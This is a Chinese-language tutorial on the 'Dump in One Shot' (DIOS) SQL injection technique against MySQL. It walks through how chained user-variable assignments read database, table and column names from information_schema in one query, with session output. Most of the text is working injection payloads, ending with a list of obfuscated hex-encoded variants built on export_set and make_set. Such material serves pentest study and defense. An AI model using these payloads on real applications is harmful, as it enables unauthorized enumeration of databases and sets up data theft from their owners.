#Dump in One Shot  
Edit by Qsaka  

----  

本文将来介绍Dump in One Shot(DIOS)这种SQL注入手法   

##例子  
先来看一个例子  

    (select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata) where 
    (@a) in (@a:=concat(@a,schema_name,'<br>'))))a)  
    
上面的SQL语句会一次性返回所有数据库的名称  

    +-------------------------------------------------------------------------------------+
    | (@a)                                                                                |
    +-------------------------------------------------------------------------------------+
    |  information_schema<br>mysql<br>performance_schema<br>t3st<br>test<br>yii2basic<br> |
    +-------------------------------------------------------------------------------------+
    1 row in set (0.00 sec)

**请先仔细想想这条语句是如何执行的，再看下面的分析**  

##原理分析  
先让我们从最内层开始，分析这条语句是如何执行的  

     (@a:=concat(@a,schema_name,'<br>'))  

首先你要知道@a是一个变量。`concat()`将`@a,schema_name,'</br>'`三者进行拼接，`:=`是赋值操作。但是有一点你需要注意，只要`concat()`中有NULL时，都会返回NULL   
    
    mysql> select @a;
    +------+
    | @a   |
    +------+
    | NULL |
    +------+
    1 row in set (0.00 sec)    
    mysql> select (@a:=concat(@a,schema_name,'<br>')) from information_schema.schemata;
    +-------------------------------------+
    | (@a:=concat(@a,schema_name,'<br>')) |
    +-------------------------------------+
    | NULL                                |
    | NULL                                |
    | NULL                                |
    | NULL                                |
    | NULL                                |
    | NULL                                |
    +-------------------------------------+
    6 rows in set (0.00 sec)
    

所以执行时先要对`@a`进行赋值。这也就是本文例子中为什么要`select(@a:=0x00)`的原因。  

    mysql> set @a:=0x00;
    Query OK, 0 rows affected (0.00 sec)
    
    mysql> select (@a:=concat(@a,schema_name,'<br>')) from information_schema.schemata;
    +-------------------------------------------------------------------------------------+
    | (@a:=concat(@a,schema_name,'<br>'))                                                 |
    +-------------------------------------------------------------------------------------+
    |  information_schema<br>                                                             |
    |  information_schema<br>mysql<br>                                                    |
    |  information_schema<br>mysql<br>performance_schema<br>                              |
    |  information_schema<br>mysql<br>performance_schema<br>t3st<br>                      |
    |  information_schema<br>mysql<br>performance_schema<br>t3st<br>test<br>              |
    |  information_schema<br>mysql<br>performance_schema<br>t3st<br>test<br>yii2basic<br> |
    +-------------------------------------------------------------------------------------+
    6 rows in set (0.00 sec)
    
再看包含这条`concat()`从句的语句  
   
    select (@a) from (information_schema.schemata) where (@a)in (@a:=concat(@a,schema_name,'<br>'))  
    
这是一条SQL中的 where in 语句。但是请仔细想一想，这和通常的 where in 语句是不是有些区别？`@a`既不是一个字段的名称，`in` 后面也不是可能取到的值集合。
好吧，如果你纠结在这里，你就输了（´∀｀*) 。  

    mysql> (select (@a) from (select(@a:=0x00),(select (‘hahaha’) from (information_schema.schemata) where ('biubiubiu') in (@a:=concat(@a,schema_name,'<br>'))))a);
    +-------------------------------------------------------------------------------------+
    | (@a)                                                                                |
    +-------------------------------------------------------------------------------------+
    |  information_schema<br>mysql<br>performance_schema<br>t3st<br>test<br>yii2basic<br> |
    +-------------------------------------------------------------------------------------+
    1 row in set (0.00 sec)
    
同样返回了所有数据库名称。是不是觉得很神奇(￣▽￣)"。其实`(select(@a:=0x00),(select (@a) from (information_schema.schemata) where (@a) in (@a:=concat(@a,schema_name,'<br>'))))`这条语句的作用仅仅是不断的将schema_name字段中的值追加到`@a`变量中,而不是返回一个*有效的结果集*。最终我们是通过变量`@a`来得到所有的数据库名    

    mysql> (select(@a:=0x00),(select (@a) from (information_schema.schemata) where (@a) in (@a:=concat(@a,schema_name,'<br>'))));
    +------------+----------------------------------------------------------------------------------------------------+
    | (@a:=0x00) | (select (@a) from (information_schema.schemata) where (@a) in (@a:=concat(@a,schema_name,'<br>'))) |
    +------------+----------------------------------------------------------------------------------------------------+
    |            | NULL                                                                                               |
    +------------+----------------------------------------------------------------------------------------------------+
    1 row in set (0.00 sec)
    
    mysql> select @a;
    +-------------------------------------------------------------------------------------+
    | @a                                                                                  |
    +-------------------------------------------------------------------------------------+
    |  information_schema<br>mysql<br>performance_schema<br>t3st<br>test<br>yii2basic<br> |
    +-------------------------------------------------------------------------------------+
    1 row in set (0.00 sec)  
           

####获取所有的表名  

    (select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables) where (@a)in (@a:=concat(@a,table_name,'<br>'))))a);  
    
####获取非information_schema中的表  

    (select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables) where table_schema!='information_schema' and(@a)in (@a:=concat(@a,table_name,'<br>'))))a)  
    
####获取数据库与表的关系  

    (select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables) where table_schema!='information_schema' and(@a)in (@a:=concat(@a,table_schema,0x3a,table_name,'<br>'))))a)  
    
####一次性返回数据库的所有信息  

    (select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns) where table_schema!='information_schema' and(@a)in (@a:=concat(@a,table_schema,' > ',table_name,' > ',column_name,'<br>'))))a)

####进行模糊匹配查询  

    (select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and table_name like 'SHOP%' and(@a)in (@a:=concat(@a,table_schema,' > ',table_name,' > ',column_name,'<br>'))))a)
 
##更多的DIOS姿势  

    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)  
    
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))  
    
    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))  
    
    (select 1,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@))  
 
##Reference  
[DIOS (Dump in One Shot) Explained](http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)  
[DIOS (Dump in One Shot) Explained Part 2](http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html)  
[DIOS the SQL Injectors Weapon (Upgraded)](http://securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html)  